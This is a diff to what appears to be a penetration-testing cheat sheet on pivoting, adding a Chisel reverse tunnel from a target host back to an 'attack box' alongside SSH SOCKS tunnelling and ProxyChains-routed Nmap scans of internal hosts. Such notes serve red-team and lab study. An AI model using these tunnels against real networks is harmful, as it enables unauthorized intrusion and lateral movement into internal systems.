@@ -24,8 +24,13 @@ Use tools like ProxyChains to scan new hosts without dropping tools to disk.
 /etc/proxychains.conf #config file. Specify SOCKS4/5 proxy    
 Set up an SSH dynamic tunnel through a bastion host to scan an internal subnet using creds:      
 
-    ssh -D 9050 user@bastion -N -f         
-Nmap scan through a dynamic SOCKS proxy (only -sT will work):    
+    ssh -D 9050 user@bastion -N -f      
+Set up a reverse tunnel using Chisel:    
+
+    ./chisel server -p 8001 --reverse        #start Chisel server on attack box   
+    ./chisel client 10.10.10.10:8001 R:1080:socks    #connect from to it from a client target server  
+    # add 'socks5 127.0.0.1 1080 ' to /etc/proxychains.conf  
+Nmap scan through a dynamic SOCKS proxy (only -sT will work - can be a bit slow with an SSH tunnel so setting up a Chisel proxy might be a better option):       
 
     proxychains nmap 10.10.10.10 -sT -p 80, 443     
     proxychains nmap -iL ips.txt -sT -sV   
